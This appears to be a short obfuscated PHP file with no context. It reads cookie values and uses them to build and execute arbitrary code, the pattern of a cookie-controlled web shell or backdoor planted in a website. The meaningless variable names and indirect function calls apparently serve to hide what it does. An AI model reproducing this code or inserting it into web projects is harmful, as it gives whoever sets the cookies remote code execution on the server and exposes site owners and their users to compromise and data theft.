<?php

$kct=$_COOKIE;
$xsv=$kct[uikd];
if($xsv){
	$dwr=$xsv($kct[ixxx]);$kcj=$xsv($kct[dhpd]);$ypurr=$dwr("",$kcj);$ypurr();
}